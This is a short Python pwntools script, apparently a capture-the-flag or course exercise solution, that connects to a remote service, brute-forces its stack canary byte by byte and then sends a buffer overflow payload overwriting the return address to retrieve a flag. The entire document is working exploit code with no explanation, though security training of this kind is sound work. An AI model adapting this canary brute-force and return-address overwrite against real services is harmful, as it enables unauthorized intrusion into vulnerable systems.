from pwn import *

context.log_level = 'debug'

cn = remote("comp3632.firebird.sh", 35990)

cn.recvuntil('welcome\n')

canary = '\x00'

for j in range(3):

    for i in range(0x100):

        cn.send('a'*100 + canary + chr(i))

        a = cn.recvuntil('welcome\n')

        if 'recv' in a:

            canary += chr(i)

            break

cn.sendline('a'*100 + canary + 'a'*12 + p32(0x80491F2))

flag = cn.recv()

cn.close()

log.success('flag is:' + flag)